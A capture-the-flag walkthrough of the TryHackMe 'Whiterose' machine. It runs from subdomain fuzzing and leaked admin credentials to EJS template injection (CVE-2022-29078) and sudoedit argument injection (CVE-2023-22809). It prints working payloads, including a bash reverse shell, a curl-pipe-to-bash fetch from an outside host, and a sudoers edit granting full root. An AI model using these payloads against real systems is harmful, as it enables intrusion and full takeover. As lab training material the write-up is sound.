---
title: 'TryHackMe - Whiterose'
author: r2cook
categories: [TryHackMe]
tags: [vhost, subdomain-fuzzing, ssti, nodejs, expressjs, ejs, cve-2022-29078, RCE, PrivEsc, sudoedit,cve-2023-22809]
render_with_liquid: false
media_subpath: /images/thm/whiterose/
image:
  path: room_card.png
---

> In this walkthrough, we compromise the TryHackMe **WhiteRose** machine by enumerating the exposed web infrastructure, identifying a hidden administrative virtual host, abusing an **EJS Server-Side Template Injection (SSTI)** vulnerability (**CVE-2022-29078**) for remote code execution, and finally escalating privileges through the **sudoedit argument injection flaw** (**CVE-2023-22809**) to obtain full root access.

---

## Initial Setup

The first step is to ensure the target hostname resolves correctly for virtual host routing.

```plaintext
10.113.171.189 whiterose.thm 
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

Start with a quick sweep, then follow up with service detection:

```shell
» rustscan -a whiterose.thm -g
10.113.171.189 -> [22,80]

» nmap -p 22,80 -sV -sC -T4 -oN nmap_scan.txt whiterose.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 16:42 EET
Nmap scan report for whiterose.thm (10.113.171.189)
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno }

Only **SSH** and **HTTP** are exposed, which strongly suggests the intended path is web exploitation followed by local privilege escalation.

---

## Web Portal Enumeration (Port 80)

![](web_portal_80_redierct_to_another_domain.webp){: width="800" height="400" .shadow }

Browsing the site reveals a redirect:

`http://whiteroes.thm` → `http://cyprusbank.thm`

This confirms **name-based virtual hosting**.

Add the discovered host:

```plaintext
10.113.171.189 whiterose.thm cyprusbank.thm
```
{: file="/etc/hosts" }

Refresh the page:

![](web_portal_80_eum.webp){: width="800" height="400" .shadow }

### Directory Fuzzing

```shell
» ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-u http://cyprusbank.thm/FUZZ \
-e .php,.txt,.zip,.sql,.bak,.old,.log \
-mc 200,204,301,302,307,401,403 \
-c | tee fuff_result.txt
...
index.html [Status: 200, ...]
...
```
{: .nolineno }

Directory discovery does not expose anything immediately useful, so the focus shifts toward **vhost enumeration and application logic**.

### Subdomain Fuzzing

First establish a baseline size for invalid hosts:

```shell
» curl -s -H "Host: notexists.cyprusbank.thm" http://cyprusbank.thm | wc -c
57
```
{: .nolineno }

Now fuzz subdomains:

```shell
» ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
-u http://cyprusbank.thm \
-H "HOST : FUZZ.cyprusbank.thm" \
-fs 57 -c | tee ffuf_subdomain_result.txt
...
www    [Status: 200, ..]
admin  [Status: 302, ..]
...
```
{: .nolineno }

The **admin** virtual host is the critical finding.

Add it locally:

```plaintext
10.113.171.189 whiterose.thm cyprusbank.thm admin.cyprusbank.thm
```
{: file="/etc/hosts" }

Administrative login portal:

![](admin_vhost_login_page.webp){: width="800" height="400" .shadow }

Use the provided credentials:

```txt
Olivia Cortez:olivi8
```

![](admin_login_success.webp){: width="800" height="400" .shadow }

---

## Application Enumeration

### Search Page

![](admin_search_seaction.webp){: width="800" height="400" .shadow }

The `search` page was tested for **SQL injection**, but nothing meaningful surfaced.

One useful observation: **Tyrell Wellick’s phone number is partially masked**, suggesting the backend applies **role-based data filtering**.

### Restricted Settings

![](admin_settings_section.webp){: width="800" height="400" .shadow }

The `settings` page is blocked for this user role.

This confirms horizontal privilege boundaries exist inside the application.

### Messages Logic Flaw

`/admin/messages/?c=5`

![](admin_message_section.webp){: width="800" height="400" .shadow }

The parameter `c=5` initially looks like it may reference a chat ID.

Testing shows lowering the number removes one visible message:

![](admin_message_section_with_c_4.webp){: width="800" height="400" .shadow }

So `c` is actually a **message count limit**, not an identifier.

Increasing the value exposes older internal messages.

At `c=11`, sensitive credentials are leaked directly in chat history:

![](admin_message_section_with_c_11_creds_exposed.webp){: width="800" height="400" .shadow }

This is a classic **information disclosure via unbounded pagination / insecure record expansion**.

Login with the leaked **Gayle Bev** credentials:

![](admin_login_with_gyle_creds.webp){: width="800" height="400" .shadow }

Now privileged data becomes visible, including Tyrell’s full phone number:

![](admin_Tyrell_phone_number.webp){: width="800" height="400" .shadow }

---

## SSTI Discovery

The settings page is now accessible:

![](admin_settings_section_opened.webp){: width="800" height="400" .shadow }

Testing with:

- customer: `test`
    
- password: `testpassword`
    

shows the password reflected in the response:

![](admin_settings_section_reflected_password.webp){: width="800" height="400" .shadow }

To confirm this is backend rendering rather than JavaScript DOM reflection, capture the request in Burp:

![](admin_setting_cupture_req_with_burp.webp){: width="800" height="400" .shadow }

The response headers reveal:

```http
X-Powered-By: Express
```

After forcing an error by removing the password field, the backend leaks:

```html
settings.ejs
```

![](admin_settings_POST_req_raised_error.webp){: width="800" height="400" .shadow }

This confirms the application stack is:

- **Node.js**
    
- **Express**
    
- **EJS template engine**
    

At this point, **CVE-2022-29078** becomes the prime exploitation path.

---

## CVE-2022-29078 — EJS SSTI to RCE

The vulnerability affects **EJS <= 3.1.6**.

The root cause is unsafe handling of the template option:

```text
outputFunctionName
```

Because Express parses nested POST parameters, we can inject:

```url
settings[view options][outputFunctionName]
```

Older EJS versions insert this directly into generated JavaScript during template compilation.

That means attacker-controlled input becomes **server-side JavaScript execution**.

### Proof of Execution

```url
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('sleep 5');s
```

The delayed response confirms blind command execution.

### Reverse Shell Payload

```shell
bash -i >& /dev/tcp/<IP>/9001 0>&1
```
{: .nolineno }

Store it locally in `shell.sh`:

```shellell.sh
bash -i >& /dev/tcp/<IP>/9001 0>&1
```
{: .nolineno }

![](shell_sh_script.webp){: width="800" height="400" .shadow }

Host it:

```shell
sudo python3 -m http.server 80
```
{: .nolineno }

![](hosting_shell_sh_with_python_http_server.webp){: width="800" height="400" .shadow }

Trigger command execution:

```url
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 192.168.205.109/shell.sh|bash');s
```

Open listener:

![](nc_open_listner_9001.webp){: width="800" height="400" .shadow }

Send payload:

![](send_payload_via_burp.webp){: width="800" height="400" .shadow }

Interactive shell received:

![](shell_obtained.webp){: width="800" height="400" .shadow }

Read the user flag:

![](cat_user_falg.webp){: width="800" height="400" .shadow }

---

## Privilege Escalation

Check sudo rights:

![](sudo_l.webp){: width="800" height="400" .shadow }

```shell
User web may run the following commands on cyprusbank:
   (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
{: .nolineno }

Check version:

```shell
web@cyprusbank:~$ sudoedit --version
Sudo version 1.9.12p1
```
{: .nolineno }

This version is vulnerable to **CVE-2023-22809**.

---

## CVE-2023-22809 — sudoedit Argument Injection

Affected versions improperly trust environment editor variables:

- `EDITOR`
    
- `VISUAL`
    
- `SUDO_EDITOR`
    

By abusing `--`, we can force the editor to open arbitrary files:

```shell
export EDITOR="vim -- /etc/sudoers"
```
{: .nolineno }

Trigger the allowed sudoedit command:

```shell
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
{: .nolineno }

![](execute_privesc1.webp){: width="800" height="400" .shadow }

Although sudo policy allows only the nginx config file, vulnerable parsing causes Vim to also load:

```text
/etc/sudoers
```

Append:

```vim
web ALL=(ALL) NOPASSWD: ALL
```

![](editing_sudoers.webp){: width="800" height="400" .shadow }

Verify:

```shell
web@cyprusbank:~$ sudo -l
```
{: .nolineno }

![](sudo_l_aftere_explooit.webp){: width="800" height="400" .shadow }

Now root shell is trivial:

```shell
web@cyprusbank:~$ sudo su -
root@cyprusbank:~#
```
{: .nolineno }

![](cat_root_flag.webp){: width="800" height="400" .shadow }

---